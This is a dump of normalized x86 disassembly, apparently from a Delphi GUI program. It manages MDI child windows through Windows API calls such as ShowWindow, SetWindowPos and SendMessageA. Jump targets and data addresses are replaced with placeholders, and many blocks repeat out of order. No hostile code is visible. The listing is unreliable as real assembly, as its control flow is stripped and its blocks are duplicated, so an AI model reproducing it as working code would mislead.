mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4425bc
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_4493d8
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4493d8
push eax
call SetWindowPos
jmp r-xdata
mov eax [ rw-data ]
call sub_4601f4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_442600
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4493d8
push eax
call IsIconic
test eax eax
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4493d8
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4493d8
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4493d8
call sub_459778
mov ebx eax
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4493d8
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_460230
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4425bc
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_460200
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4493d8
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_4493d8
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_442e18
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4493d8
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4493d8
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_460224
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_442600
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_4601f4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_45cdc4
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_45cdc4
jmp r-xdata
sub_45ea25
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_462838
call sub_403a3c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ rw-data ]
call sub_460200
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4425bc
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_4601f4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_442600
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4493d8
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_460230
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4425bc
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_460200
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45eebc
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4493d8
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_4493d8
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_442e18
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4493d8
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4493d8
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_460224
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_442600
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_4601f4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_45cdc4
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_45cdc4
jmp r-xdata
sub_45edc1
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_462838
call sub_403a3c
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45db14
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4468f8
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_4493d8
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4493d8
push eax
call SetWindowPos
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45eebc
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4493d8
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4493d8
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4493d8
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4493d8
call sub_459778
mov ebx eax
sub_45ef08
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
retn
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
sub_45ef60
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
cmp [ esi + 0x59 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4238d0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45efbe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x68 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403234
retn
mov eax [ esi + 0x68 ]
mov edx [ edx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_45efcc
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
mov si 0xffab
call sub_403430
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45eff8
push ebx
push esi
push ecx
mov ebx eax
test [ ebx + 0x2f4 ] 0x8
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov [ ebx + 0x24c ] 0x2
jmp r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov [ esp ] 0x1
test [ ebx + 0x228 ] 0x2
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov [ esp ] 0x3
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_462824
jmp r-xdata
mov edx esp
mov eax ebx
mov si 0xffb0
call sub_403430
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x3
jne r-xdata
mov eax ebx
call sub_45f198
jmp r-xdata
mov eax ebx
call sub_45f234
mov dl 0x1
mov eax ebx
call sub_45cd84
jmp r-xdata
sub_45f09c
push ebx
push esi
push edi
push ecx
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x29a ] 0x0
je r-xdata
mov [ esp ] 0x0
mov eax ebx
call sub_45c710
mov esi eax
dec esi
test esi esi
jl r-xdata
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x29c ]
call [ ebx + 0x298 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_45c75c
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
sub_45f100
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45f16c
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_403430
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45f234
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45f1b8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_45f226
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f22d
lea eax [ ebp - 0x4 ]
call sub_404008
retn
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_45da10
sub_45f250
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45f518
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_441418
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call ReleaseCapture
mov eax [ rw-data ]
call sub_4616f0
xor edx edx
push ebp
push sub_45f4fb
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x8
call GetActiveWindow
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x78 ]
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
xor edx edx
call sub_41a4e4
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x78 ] edx
mov eax [ rw-data ]
mov ax [ eax + 0x44 ]
mov [ ebp - 0x12 ] ax
xor edx edx
mov eax [ rw-data ]
call sub_460720
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x18 ] eax
xor eax eax
call sub_459628
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_45f4d9
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_45f1a0
xor edx edx
push ebp
push sub_45f438
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
call sub_4493d8
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45f100
call GetCapture
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_4625a4
mov eax [ rw-data ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
call sub_4493d8
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_4493d8
mov ebx eax
call GetActiveWindow
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f43f
mov eax [ ebp - 0x4 ]
call sub_45f198
retn
xor eax eax
mov [ ebp - 0x1c ] eax
sub_45f43f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f4e3
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_460720
mov dx [ ebp - 0x12 ]
mov eax [ rw-data ]
call sub_460720
jmp r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov eax ebx
call sub_41a460
mov esi eax
mov eax [ rw-data ]
mov [ eax + 0x78 ] esi
mov edx esi
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
call sub_41a604
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_4596dc
mov eax [ rw-data ]
mov ebx [ eax + 0x7c ]
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xf7
retn
mov eax [ ebp - 0x1c ]
push eax
call SetActiveWindow
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_45f528
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4460d0
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45f528
pop ecx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_446094
mov ebx eax
test [ ebx + 0x51 ] 0x80
je r-xdata
sub_45f598
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov esi [ ebx + 0x248 ]
test esi esi
je r-xdata
push ebp
mov eax ebx
call sub_45f528
pop ecx
mov eax [ esi + 0x34 ]
call sub_4549d8
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebx + 0x248 ]
mov eax [ eax + 0x34 ]
mov edx edi
call sub_4549e8
cmp [ eax + 0x3e ] 0x0
je r-xdata
sub_45f61c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4476f0
cmp [ esi + 0x4 ] 0x2f
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffd0
call sub_403430
sub_45f640
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff3
call sub_403430
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_45f670
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_4460d0
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45f640
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45f670
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_446094
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45f6ec
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_45f640
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_45f640
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_45f670
pop ecx
test al al
je r-xdata
sub_45f740
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff0
call sub_403430
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_45f770
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_4460d0
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45f740
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45f770
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_446094
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45f7ec
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_45f740
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_45f740
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_45f770
pop ecx
test al al
je r-xdata
sub_45f840
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
